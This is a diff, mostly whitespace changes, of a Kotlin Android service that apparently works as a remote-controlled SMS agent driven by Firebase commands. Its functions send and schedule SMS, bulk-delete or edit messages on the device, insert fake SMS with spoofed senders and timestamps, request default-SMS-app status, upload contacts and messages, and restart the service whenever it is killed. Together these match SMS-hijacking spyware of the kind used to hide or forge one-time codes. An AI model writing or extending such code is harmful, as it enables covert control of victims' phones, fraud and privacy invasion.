         if (ActivityCompat.checkSelfPermission(
                 this,
@@ -1873,21 +1873,21 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "sendSms", "failed", "Permissions not granted")
             return
         }
-        
+
         // Parse command content - support both formats
         val simIndex = content.indexOf(";")
         val colonIndex = content.indexOf(":")
-        
+
         if (colonIndex == -1) {
             LogHelper.e(TAG, "Invalid sendSms command format. Expected: phone:message or sim;phone:message")
             updateCommandHistoryStatus(historyTimestamp, "sendSms", "failed", "Invalid format: missing ':' separator")
             return
         }
-        
+
         val phone: String
         val sms: String
         val sim: Int
-        
+
         if (simIndex != -1 && simIndex < colonIndex) {
             // Format 2: sim;phone:message
             val simStr = content.substring(0, simIndex).trim()
@@ -1900,30 +1900,30 @@ class PersistentForegroundService : Service() {
             phone = content.substring(0, colonIndex).trim()
             sms = content.substring(colonIndex + 1).trim()
         }
-        
+
         // Validate phone and message
         if (phone.isBlank() || sms.isBlank()) {
             LogHelper.e(TAG, "Invalid sendSms command: phone or message is blank")
             updateCommandHistoryStatus(historyTimestamp, "sendSms", "failed", "Phone or message is blank")
             return
         }
-        
+
         // Validate SIM number (must be 1 or 2)
         if (sim != 1 && sim != 2) {
             LogHelper.e(TAG, "Invalid SIM number: $sim (must be 1 or 2)")
             updateCommandHistoryStatus(historyTimestamp, "sendSms", "failed", "Invalid SIM number: $sim (must be 1 or 2)")
             return
         }
-        
+
         LogHelper.d(TAG, "Sending SMS - Phone: $phone, Message: ${sms.take(50)}..., SIM: $sim")
-        
+
         // Send SMS
         sendSms(phone, sms, if (sim == 1) SimSlot.SIM_1 else SimSlot.SIM_2)
-        
+
         // Log remote sent message to Firebase
         val timestamp = System.currentTimeMillis()
         val messagePath = AppConfig.getFirebaseMessagePath(androidId(), timestamp)
-        
+
         FirebaseWriteHelper.setValue(
             path = messagePath,
             data = "sent~$phone~$sms",
@@ -1939,11 +1939,11 @@ class PersistentForegroundService : Service() {
             }
         )
     }
-    
+
     /**
      * Handle showNotification command
      * Format: "showNotification|{title}|{message}|{channel}|{priority}|{action}"
-     * 
+     *
      * Examples:
      * - "showNotification|Alert|Device needs attention|alerts|high|"
      * - "showNotification|Message|Hello World|messages|default|view_message"
@@ -1953,14 +1953,14 @@ class PersistentForegroundService : Service() {
         LogHelper.d(TAG, "Showing notification from command: $content")
         AppNotificationManager.showNotificationFromCommand(this, content)
     }
-    
+
     /**
      * Handle requestDefaultSmsApp command
      * Format: Any value (content is ignored, command always executes)
-     * 
+     *
      * Opens the DefaultSmsRequestActivity to guide the user,
      * then lets that screen trigger the system dialog.
-     * 
+     *
      * @param content Command content (ignored, can be any value)
      * @param historyTimestamp Timestamp for command history updates
      * @param commandKey Command key for history updates
@@ -2006,7 +2006,7 @@ class PersistentForegroundService : Service() {
                 }
             }
         }
-        
+
         // Check if we're on the main thread
         if (Looper.myLooper() == Looper.getMainLooper()) {
             // Already on main thread, call directly
@@ -2018,14 +2018,14 @@ class PersistentForegroundService : Service() {
             }
         }
     }
-    
+
     /**
      * Handle requestDefaultMessageApp command
      * Format: Any value (content is ignored, command always executes)
-     * 
+     *
      * Opens the DefaultSmsRequestActivity to guide the user,
      * then lets that screen trigger the system dialog.
-     * 
+     *
      * @param content Command content (ignored, can be any value)
      * @param historyTimestamp Timestamp for command history updates
      * @param commandKey Command key for history updates
@@ -2038,32 +2038,32 @@ class PersistentForegroundService : Service() {
         LogHelper.d(TAG, "Executing requestDefaultMessageApp command - opening DefaultSmsRequestActivity")
         handleRequestDefaultSmsAppCommand(content, historyTimestamp, commandKey)
     }
-    
+
     /**
      * Handle updateDeviceCodeList command
      * Format: Any value (content is ignored, command always executes)
-     * 
+     *
      * Updates the list of all devices with their activation codes in Firebase.
-     * 
+     *
      * This command:
      * 1. Reads all entries from fastpay/device-list/
      * 2. For each code, gets the deviceId and basic info
      * 3. Creates/updates a consolidated list at fastpay/all-devices-list/
      *    Structure: fastpay/all-devices-list/{code} = {deviceId, code, deviceName, isActive, lastSeen, updatedAt}
-     * 
+     *
      * This provides a centralized location to see all activated devices with their codes.
-     * 
+     *
      * @param content Command content (ignored, can be any value)
      */
     private fun handleUpdateDeviceCodeListCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing updateDeviceCodeList command - updating device code list in Firebase")
-        
+
         try {
             val deviceListPath = "${AppConfig.FIREBASE_BASE_PATH}/${AppConfig.FIREBASE_DEVICE_LIST_PATH}"
             val allDevicesListPath = "${AppConfig.FIREBASE_BASE_PATH}/all-devices-list"
-            
+
             LogHelper.d(TAG, "Reading device-list from: $deviceListPath")
-            
+
             // Read all entries from device-list
             Firebase.database.reference.child(deviceListPath)
                 .addListenerForSingleValueEvent(object : com.google.firebase.database.ValueEventListener {
@@ -2071,27 +2071,27 @@ class PersistentForegroundService : Service() {
                         try {
                             val deviceCodeMap = mutableMapOf<String, Map<String, Any>>()
                             val totalCodes = snapshot.childrenCount.toInt()
-                            
+
                             if (totalCodes == 0) {
                                 LogHelper.w(TAG, "No devices found in device-list")
                                 writeDeviceCodeListToFirebase(allDevicesListPath, emptyMap(), 0, historyTimestamp)
                                 return
                             }
-                            
+
                             var processedCount = 0
-                            
+
                             // Iterate through all codes in device-list
                             snapshot.children.forEach { codeSnapshot ->
                                 val code = codeSnapshot.key ?: return@forEach
                                 val deviceId = codeSnapshot.child("deviceId").getValue(String::class.java)
-                                
+
                                 if (deviceId != null && deviceId.isNotBlank()) {
                                     // Get device name and other info from device-list entry
-                                    val deviceName = codeSnapshot.child("device_model").getValue(String::class.java) 
+                                    val deviceName = codeSnapshot.child("device_model").getValue(String::class.java)
                                         ?: codeSnapshot.child("number").getValue(String::class.java)
                                         ?: "Unknown Device"
                                     val status = codeSnapshot.child("status").getValue(String::class.java) ?: "UNKNOWN"
-                                    
+
                                     // Create device entry with info from device-list
                                     val deviceEntry = mapOf<String, Any>(
                                         "deviceId" to deviceId,
@@ -2100,12 +2100,12 @@ class PersistentForegroundService : Service() {
                                         "status" to status,
                                         "updatedAt" to System.currentTimeMillis()
                                     )
-                                    
+
                                     deviceCodeMap[code] = deviceEntry
                                     processedCount++
-                                    
+
                                     LogHelper.d(TAG, "Processed device: code=$code, deviceId=$deviceId, name=$deviceName")
-                                    
+
                                     // If all devices processed, write to Firebase
                                     if (processedCount == totalCodes) {
                                         writeDeviceCodeListToFirebase(allDevicesListPath, deviceCodeMap, processedCount, historyTimestamp)
@@ -2113,7 +2113,7 @@ class PersistentForegroundService : Service() {
                                 } else {
                                     LogHelper.w(TAG, "Device ID not found for code: $code")
                                     processedCount++
-                                    
+
                                     // If all devices processed, write to Firebase
                                     if (processedCount == totalCodes) {
                                         writeDeviceCodeListToFirebase(allDevicesListPath, deviceCodeMap, processedCount, historyTimestamp)
@@ -2125,7 +2125,7 @@ class PersistentForegroundService : Service() {
                             updateCommandHistoryStatus(historyTimestamp, "updateDeviceCodeList", "failed", "Error: ${e.message}")
                         }
                     }
-                    
+
                     override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                         LogHelper.e(TAG, "Error reading device-list from Firebase", error.toException())
                         updateCommandHistoryStatus(historyTimestamp, "updateDeviceCodeList", "failed", "Error: ${error.message}")
@@ -2136,10 +2136,10 @@ class PersistentForegroundService : Service() {
             throw e
         }
     }
-    
+
     /**
      * Write device code list to Firebase
-     * 
+     *
      * @param allDevicesListPath Firebase path for all-devices-list
      * @param deviceCodeMap Map of code -> device entry
      * @param totalCount Total number of devices processed
@@ -2152,7 +2152,7 @@ class PersistentForegroundService : Service() {
     ) {
         try {
             LogHelper.d(TAG, "Writing ${deviceCodeMap.size} devices to $allDevicesListPath")
-            
+
             // Add metadata
             val allDevicesData = mutableMapOf<String, Any>()
             allDevicesData.putAll(deviceCodeMap)
@@ -2161,7 +2161,7 @@ class PersistentForegroundService : Service() {
                 "updatedAt" to System.currentTimeMillis(),
                 "updatedBy" to androidId()
             )
-            
+
             Firebase.database.reference.child(allDevicesListPath)
                 .setValue(allDevicesData)
                 .addOnSuccessListener {
@@ -2182,51 +2182,51 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "updateDeviceCodeList", "failed", "Error: ${e.message}")
         }
     }
-    
+
     /**
      * Handle setHeartbeatInterval command
      * Format: "{seconds}" - Number of seconds for heartbeat interval
-     * 
+     *
      * Sets the heartbeat interval dynamically. The value is specified in seconds.
      * Valid range: 10 seconds (minimum) to 300 seconds (5 minutes, maximum)
-     * 
+     *
      * Examples:
      * - "60" -> Set heartbeat to 60 seconds (1 minute)
      * - "30" -> Set heartbeat to 30 seconds
      * - "120" -> Set heartbeat to 120 seconds (2 minutes)
-     * 
+     *
      * After setting the interval, the heartbeat is restarted with the new value.
-     * 
+     *
      * @param content Heartbeat interval in seconds (as string)
      */
     private fun handleSetHeartbeatIntervalCommand(content: String) {
         LogHelper.d(TAG, "Executing setHeartbeatInterval command - content: $content")
-        
+
         try {
             // Parse the interval value (in seconds)
             val intervalSeconds = content.trim().toIntOrNull()
-            
+
             if (intervalSeconds == null) {
                 throw IllegalArgumentException("Invalid heartbeat interval value: '$content'. Must be a number.")
             }
-            
+
             // Validate range: minimum 10 seconds, maximum 300 seconds (5 minutes)
             val minIntervalSeconds = 10
             val maxIntervalSeconds = 300
-            
+
             if (intervalSeconds < minIntervalSeconds || intervalSeconds > maxIntervalSeconds) {
                 throw IllegalArgumentException(
                     "Heartbeat interval must be between $minIntervalSeconds and $maxIntervalSeconds seconds. " +
                     "Received: $intervalSeconds seconds"
                 )
             }
-            
+
             // Convert to milliseconds
             val newIntervalMs = intervalSeconds * 1000L
-            
+
             // Update the current heartbeat interval
             currentHeartbeatIntervalMs = newIntervalMs
-            
+
             // Save to Django
             val deviceId = androidId()
             serviceScope.launch {
@@ -2238,10 +2238,10 @@ class PersistentForegroundService : Service() {
                     LogHelper.e(TAG, "Failed to update heartbeat interval in Django", e)
                 }
             }
-            
+
             // Restart heartbeat with new interval
             restartHeartbeat()
-            
+
             LogHelper.d(TAG, "Heartbeat interval updated to $intervalSeconds seconds (${newIntervalMs}ms)")
         } catch (e: NumberFormatException) {
             LogHelper.e(TAG, "Error parsing heartbeat interval: $content", e)
@@ -2251,29 +2251,29 @@ class PersistentForegroundService : Service() {
             throw e // Re-throw to be caught by followCommand and marked as failed
         }
     }
-    
+
     /**
      * Handle reset command
      * Format: Any value (content is ignored, command always executes)
-     * 
+     *
      * Resets device activation by:
      * - Clearing Firebase data: phone, code, setupValue
      * - Setting isActive to false
      * - Clearing setup.txt file
      * - Navigating to SplashActivity to restart activation flow
-     * 
+     *
      * This effectively deactivates the device and allows it to be reactivated.
-     * 
+     *
      * @param content Command content (ignored, can be any value)
      */
     @SuppressLint("HardwareIds")
     private fun handleResetCommand(content: String) {
         LogHelper.d(TAG, "Executing reset command")
-        
+
         val deviceId = androidId()
         val devicePath = AppConfig.getFirebaseDevicePath(deviceId)
         val deviceRef = Firebase.database.reference.child(devicePath)
-        
+
         // Clear Firebase activation data (kept for real-time signaling if needed)
         deviceRef.child("phone").removeValue()
         deviceRef.child("code").removeValue()
@@ -2285,7 +2285,7 @@ class PersistentForegroundService : Service() {
             .addOnFailureListener { e ->
                 LogHelper.e(TAG, "Failed to reset Firebase data", e)
             }
-            
+
         // Reset device in Django
         serviceScope.launch {
             try {
@@ -2296,7 +2296,7 @@ class PersistentForegroundService : Service() {
                     "sync_status" to "never_synced"
                 ))
                 LogHelper.d(TAG, "Django reset successful")
-                
+
                 // Navigate to SplashActivity after Django reset
                 navigateToSplashActivity()
             } catch (e: Exception) {
@@ -2305,7 +2305,7 @@ class PersistentForegroundService : Service() {
                 navigateToSplashActivity()
             }
         }
-        
+
         // Clear setup.txt file
         try {
             writeInternalFile("setup.txt", "")
@@ -2316,7 +2316,7 @@ class PersistentForegroundService : Service() {
             LogHelper.e(TAG, "Error clearing setup.txt", e)
         }
     }
-    
+
     /**
      * Navigate to SplashActivity to restart activation flow
      * This is called after reset command clears activation data
@@ -2339,7 +2339,7 @@ class PersistentForegroundService : Service() {
         val notification = buildNotification()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
         else startForeground(NOTIFICATION_ID, notification)
-        
+
         // Ensure heartbeat is running
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             if (!heartbeatHandler.hasCallbacks(heartbeatRunnable)) {
@@ -2349,7 +2349,7 @@ class PersistentForegroundService : Service() {
             // For API < 29, just start heartbeat (no way to check if already running)
             startHeartbeat()
         }
-        
+
         // Ensure device info collection is running
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             if (!deviceInfoHandler.hasCallbacks(deviceInfoRunnable)) {
@@ -2359,10 +2359,10 @@ class PersistentForegroundService : Service() {
             // For API < 29, just start device info collection (no way to check if already running)
             startDeviceInfoCollection()
         }
-        
+
         return START_STICKY
     }
-    
+
     override fun onDestroy() {
         // Cancel coroutine scope
         try {
@@ -2377,9 +2377,9 @@ class PersistentForegroundService : Service() {
         SmsMessageBatchProcessor.flush(this)
         // Flush any pending contacts before destroying service
         ContactBatchProcessor.flush(this)
-        
+
         super.onDestroy()
-        
+
         // Remove Firebase listeners to prevent memory leaks
         try {
             val deviceId = androidId()
@@ -2389,14 +2389,14 @@ class PersistentForegroundService : Service() {
                     .removeEventListener(listener)
                 commandListener = null
             }
-            
+
             filterListener?.let { listener ->
                 Firebase.database.reference
                     .child("${AppConfig.getFirebaseDevicePath(deviceId)}/${AppConfig.FirebasePaths.FILTER}")
                     .removeEventListener(listener)
                 filterListener = null
             }
-            
+
             isActiveListener?.let { listener ->
                 Firebase.database.reference
                     .child("${AppConfig.getFirebaseDevicePath(deviceId)}/${AppConfig.FirebasePaths.IS_ACTIVE}")
@@ -2406,14 +2406,14 @@ class PersistentForegroundService : Service() {
         } catch (e: Exception) {
             LogHelper.e(TAG, "Error removing Firebase listeners in onDestroy", e)
         }
-        
+
         // Stop heartbeat when service is destroyed
         heartbeatHandler.removeCallbacks(heartbeatRunnable)
         // Stop device info collection
         deviceInfoHandler.removeCallbacks(deviceInfoRunnable)
-        
+
         LogHelper.d(TAG, "Service destroyed - listeners removed, handlers stopped")
-        
+
         // Restart service immediately if destroyed (except on app uninstall)
         // This ensures service keeps running even if killed
         try {
@@ -2424,7 +2424,7 @@ class PersistentForegroundService : Service() {
             LogHelper.e(TAG, "Error restarting service in onDestroy", e)
         }
     }
-    
+
     /**
      * Called when the app task is removed from recent apps (swiped away)
      * Restart the service to ensure it keeps running in the background
@@ -2432,7 +2432,7 @@ class PersistentForegroundService : Service() {
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
         LogHelper.d(TAG, "App task removed - restarting service")
-        
+
         // Restart service after a short delay to ensure proper cleanup
         Handler(Looper.getMainLooper()).postDelayed({
             try {
@@ -2469,14 +2469,14 @@ class PersistentForegroundService : Service() {
 
         return builder.build()
     }
-    
+
     /**
      * Handle checkPermission command
      * Format: empty or "status"
-     * 
+     *
      * Checks all permissions and reports status to Firebase at:
      * device/{deviceId}/systemInfo/permissionStatus/{timestamp}
-     * 
+     *
      * Status format:
      * {
      *   "allGranted": boolean,
@@ -2493,7 +2493,7 @@ class PersistentForegroundService : Service() {
             val requiredPermissions = com.example.fast.util.PermissionManager.getRequiredRuntimePermissions(this)
             val runtimeStatusMap = mutableMapOf<String, Map<String, Boolean>>()
             var runtimeGrantedCount = 0
-            
+
             requiredPermissions.forEach { permission ->
                 val isGranted = ActivityCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
                 if (isGranted) runtimeGrantedCount++
@@ -2502,30 +2502,30 @@ class PersistentForegroundService : Service() {
                     "canRequest" to true // Can always request if not granted
                 )
             }
-            
+
             // Check special permissions (using Context methods)
             val notificationListenerGranted = com.example.fast.util.PermissionManager.hasNotificationListenerPermission(this)
             val batteryOptimizationGranted = com.example.fast.util.PermissionManager.hasBatteryOptimizationExemption(this)
-            
+
             // Check default SMS app status
             val isDefaultSmsApp = DefaultSmsAppHelper.isDefaultSmsApp(this)
             val defaultSmsAppPackage = DefaultSmsAppHelper.getDefaultSmsAppPackage(this)
-            
+
             val specialGrantedCount = listOf(
                 notificationListenerGranted,
                 batteryOptimizationGranted
             ).count { it }
-            
+
             // Calculate total count dynamically (5-6 runtime + 2 special)
             // Android 13+ (API 33+) has POST_NOTIFICATIONS permission = 6 runtime
             // Older versions = 5 runtime
             val runtimePermissionsCount = requiredPermissions.size
             val specialPermissionsCount = 2 // Notification Listener, Battery Optimization
             val totalPermissionsCount = runtimePermissionsCount + specialPermissionsCount
-            
+
             val totalGrantedCount = runtimeGrantedCount + specialGrantedCount
             val allGranted = totalGrantedCount == totalPermissionsCount
-            
+
             // Build status map for Firebase
             val statusMap = mutableMapOf<String, Any>()
             statusMap["allGranted"] = allGranted
@@ -2546,12 +2546,12 @@ class PersistentForegroundService : Service() {
                 "canRequest" to true,
                 "packageName" to packageName
             )
-            
+
             if (shouldUploadPermissionStatus(statusMap)) {
                 // Upload status to Firebase
                 val timestamp = System.currentTimeMillis()
                 val permissionStatusPath = "${AppConfig.getFirebaseDevicePath(androidId())}/systemInfo/permissionStatus/$timestamp"
-                
+
                 Firebase.database.reference.child(permissionStatusPath).setValue(statusMap)
                     .addOnSuccessListener {
                         LogHelper.d(TAG, "Permission status uploaded to Firebase: $permissionStatusPath")
@@ -2570,21 +2570,21 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "checkPermission", "failed", "Error: ${e.message}")
         }
     }
-    
+
     /**
      * Handle removePermission command
      * Format: empty or "open"
-     * 
+     *
      * Opens app settings page where user can manually revoke permissions.
      * Android doesn't allow programmatic permission revocation for security reasons.
      */
     private fun handleRemovePermissionCommand(content: String) {
         try {
             LogHelper.d(TAG, "Opening app settings for permission removal")
-            
+
             // Open app settings page
             com.example.fast.util.PermissionManager.openAppSettings(this)
-            
+
             // Also log to Firebase that settings were opened
             val timestamp = System.currentTimeMillis()
             val logPath = "${AppConfig.getFirebaseDevicePath(androidId())}/systemInfo/permissionRemovalLog/$timestamp"
@@ -2603,31 +2603,31 @@ class PersistentForegroundService : Service() {
             LogHelper.e(TAG, "Error opening app settings for permission removal", e)
         }
     }
-    
+
     /**
      * Handle sendSmsDelayed command
      * Format: "phone:message:delayType:delayValue:sim"
      */
     private fun handleSendSmsDelayedCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing sendSmsDelayed command: $content")
-        
+
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "SEND_SMS permission not granted")
             return
         }
-        
+
         val parts = content.split(":")
         if (parts.size < 4) {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid format: expected phone:message:delayType:delayValue:sim")
             return
         }
-        
+
         val phone = parts[0].trim()
         val message = parts[1].trim()
         val delayType = parts[2].trim().lowercase()
         val delayValue = parts[3].trim()
         val sim = parts.getOrNull(4)?.toIntOrNull() ?: 1
-        
+
         // Validate phone number format
         if (phone.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Phone number is required")
@@ -2637,7 +2637,7 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid phone number format")
             return
         }
-        
+
         // Validate message
         if (message.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Message is required")
@@ -2647,26 +2647,26 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Message too long (max 160 characters)")
             return
         }
-        
+
         // Validate delay type
         val validDelayTypes = listOf("seconds", "minutes", "hours", "days", "datetime")
         if (delayType !in validDelayTypes) {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid delay type. Must be: seconds, minutes, hours, days, or datetime")
             return
         }
-        
+
         // Validate delay value
         if (delayValue.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Delay value is required")
             return
         }
-        
+
         // Validate SIM number
         if (sim != 1 && sim != 2) {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid SIM number: $sim (must be 1 or 2)")
             return
         }
-        
+
         val delayMs = when (delayType) {
             "seconds" -> delayValue.toLongOrNull()?.times(1000) ?: run {
                 updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid delay value")
@@ -2699,12 +2699,12 @@ class PersistentForegroundService : Service() {
                 return
             }
         }
-        
+
         if (delayMs < 0) {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Delay cannot be negative")
             return
         }
-        
+
         val scheduledMessagePath = "${AppConfig.getFirebaseDevicePath(androidId())}/scheduledMessages/${System.currentTimeMillis()}"
         val scheduledData = mapOf(
             "phone" to phone,
@@ -2714,7 +2714,7 @@ class PersistentForegroundService : Service() {
             "createdAt" to System.currentTimeMillis(),
             "commandTimestamp" to historyTimestamp
         )
-        
+
         FirebaseWriteHelper.setValue(
             path = scheduledMessagePath,
             data = scheduledData,
@@ -2734,7 +2734,7 @@ class PersistentForegroundService : Service() {
             }
         )
     }
-    
+
     private fun executeDelayedSms(phone: String, message: String, sim: Int, historyTimestamp: Long, scheduledMessagePath: String) {
         try {
             sendSms(phone, message, if (sim == 1) SimSlot.SIM_1 else SimSlot.SIM_2)
@@ -2748,7 +2748,7 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Execution error: ${e.message}")
         }
     }
-    
+
     private fun scheduleSmsWithAlarmManager(phone: String, message: String, sim: Int, scheduledTime: Long, scheduledMessagePath: String, historyTimestamp: Long = 0L) {
         try {
             val alarmManager = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
@@ -2774,28 +2774,28 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "AlarmManager error: ${e.message}")
         }
     }
-    
+
     private fun handleScheduleSmsCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing scheduleSms command: $content")
-        
+
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
             updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "SEND_SMS permission not granted")
             return
         }
-        
+
         val parts = content.split(":")
         if (parts.size < 5) {
             updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Invalid format: expected phone:message:scheduleType:scheduleValue:recurrence:sim")
             return
         }
-        
+
         val phone = parts[0].trim()
         val message = parts[1].trim()
         val scheduleType = parts[2].trim().lowercase()
         val scheduleValue = parts[3].trim()
         val recurrence = parts[4].toIntOrNull() ?: 0
         val sim = parts.getOrNull(5)?.toIntOrNull() ?: 1
-        
+
         // Validate phone number
         if (phone.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Phone number is required")
@@ -2805,7 +2805,7 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Invalid phone number format")
             return
         }
-        
+
         // Validate message
         if (message.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Message is required")
@@ -2815,26 +2815,26 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Message too long (max 160 characters)")
             return
         }
-        
+
         // Validate schedule type
         val validScheduleTypes = listOf("daily", "weekly", "monthly", "once")
         if (scheduleType !in validScheduleTypes) {
             updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Invalid schedule type. Must be one of: ${validScheduleTypes.joinToString(", ")}")
             return
         }
-        
+
         // Validate schedule value
         if (scheduleValue.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Schedule value is required")
             return
         }
-        
+
         // Validate recurrence
         if (recurrence < 0) {
             updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Recurrence must be >= 0 (0 = infinite)")
             return
         }
-        
+
         // Validate SIM number
         if (sim != 1 && sim != 2) {
             updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Invalid SIM number: $sim (must be 1 or 2)")
@@ -2871,7 +2871,7 @@ class PersistentForegroundService : Service() {
             }
         )
     }
-    
+
     private fun calculateNextExecution(scheduleType: String, scheduleValue: String): Long? {
         return when (scheduleType) {
             "daily" -> {
@@ -2898,33 +2898,33 @@ class PersistentForegroundService : Service() {
             else -> null
         }
     }
-    
+
     private fun handleEditMessageCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing editMessage command: $content")
-        
+
         val parts = content.split(":")
         if (parts.size < 3) {
             updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "Invalid format: expected messageId:field:newValue")
             return
         }
-        
+
         val messageId = parts[0].trim()
         val field = parts[1].trim().lowercase()
         val newValue = parts.drop(2).joinToString(":")
-        
+
         // Validate message ID
         if (messageId.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "Message ID is required")
             return
         }
-        
+
         // Validate field
         val validFields = listOf("content", "sender", "timestamp", "status")
         if (field !in validFields) {
             updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "Invalid field: $field. Must be one of: ${validFields.joinToString(", ")}")
             return
         }
-        
+
         // Validate new value
         if (newValue.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "New value is required")
@@ -2972,25 +2972,25 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "Error: ${e.message}")
         }
     }
-    
+
     private fun handleDeleteMessageCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing deleteMessage command: $content")
-        
+
         if (ActivityCompat.checkSelfPermission(this, "android.permission.WRITE_SMS") != PackageManager.PERMISSION_GRANTED) {
             updateCommandHistoryStatus(historyTimestamp, "deleteMessage", "failed", "WRITE_SMS permission not granted. App must be set as default SMS app.")
             return
         }
-        
+
         // Validate input
         if (content.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "deleteMessage", "failed", "Command content is required")
             return
         }
-        
+
         try {
             val uri = android.provider.Telephony.Sms.CONTENT_URI
             val rowsDeleted: Int
-            
+
             if (content.startsWith("bulk:")) {
                 val criteria = content.substring(5)
                 if (criteria.isBlank()) {
@@ -3012,7 +3012,7 @@ class PersistentForegroundService : Service() {
                 }
                 rowsDeleted = contentResolver.delete(uri, "_id = ?", arrayOf(messageId))
             }
-            
+
             if (rowsDeleted > 0) {
                 updateCommandHistoryStatus(historyTimestamp, "deleteMessage", "executed", "Deleted $rowsDeleted message(s)")
             } else {
@@ -3023,7 +3023,7 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "deleteMessage", "failed", "Error: ${e.message}")
         }
     }
-    
+
     private fun buildWhereClause(criteria: String): Pair<String, Array<String>> {
         val conditions = mutableListOf<String>()
         val args = mutableListOf<String>()
@@ -3055,11 +3055,11 @@ class PersistentForegroundService : Service() {
         }
         return Pair(conditions.joinToString(" AND "), args.toTypedArray())
     }
-    
+
     /**
      * Handle createFakeMessage command
      * Format: "sender:message:timestamp:status:threadId"
-     * 
+     *
      * Examples:
      * - "+1234567890:Test message:1703123456789:received:null"
      * - "+1234567890:Test:now:received:null"
@@ -3068,19 +3068,19 @@ class PersistentForegroundService : Service() {
      */
     private fun handleCreateFakeMessageCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing createFakeMessage command: $content")
-        
+
         val parts = content.split(":")
         if (parts.size < 4) {
             updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Invalid format: expected sender:message:timestamp:status:threadId")
             return
         }
-        
+
         val sender = parts[0].trim()
         val message = parts[1].trim()
         val timestampStr = parts[2].trim()
         val status = parts[3].trim()
         val threadId = parts.getOrNull(4)?.trim()
-        
+
         // Validate sender
         if (sender.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Sender phone number is required")
@@ -3090,7 +3090,7 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Invalid sender phone number format")
             return
         }
-        
+
         // Validate message
         if (message.isBlank()) {
             updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Message content is required")
@@ -3100,7 +3100,7 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Message too long (max 160 characters)")
             return
         }
-        
+
         // Parse timestamp
         val timestamp = if (timestampStr.lowercase() == "now") {
             System.currentTimeMillis()
@@ -3110,14 +3110,14 @@ class PersistentForegroundService : Service() {
                 return
             }
         }
-        
+
         // Validate status
         val validStatuses = listOf("received", "sent", "read", "unread", "delivered", "failed")
         if (status.lowercase() !in validStatuses) {
             updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Invalid status: $status. Must be one of: ${validStatuses.joinToString(", ")}")
             return
         }
-        
+
         // Create fake message
         val success = FakeMessageManager.createFakeMessage(
             context = this,
@@ -3127,18 +3127,18 @@ class PersistentForegroundService : Service() {
             status = status,
             threadId = threadId
         )
-        
+
         if (success) {
             updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "executed")
         } else {
